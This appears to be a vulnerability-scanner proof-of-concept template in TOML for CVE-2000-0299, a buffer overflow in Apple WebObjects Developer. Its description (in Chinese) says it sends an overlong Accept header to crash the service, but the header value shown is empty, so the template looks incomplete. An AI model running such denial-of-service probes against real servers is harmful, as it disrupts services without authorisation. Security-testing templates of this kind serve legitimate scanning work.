[info]
author = "ave"
description = "向目标 WebObjects 服务发送包含超长 Accept HTTP 请求头的 GET 请求，检测是否触发 WebObjects.exe 缓冲区溢出导致服务拒绝。"
id = "POC-AVE-2000-0259"
name = "Apple WebObjects Developer 远程缓冲区溢出漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0259"]
vuln_id = [
    "CVE-2000-0299",
    "AVE-2000-0259",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
Accept = ""

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
]
type = "status"
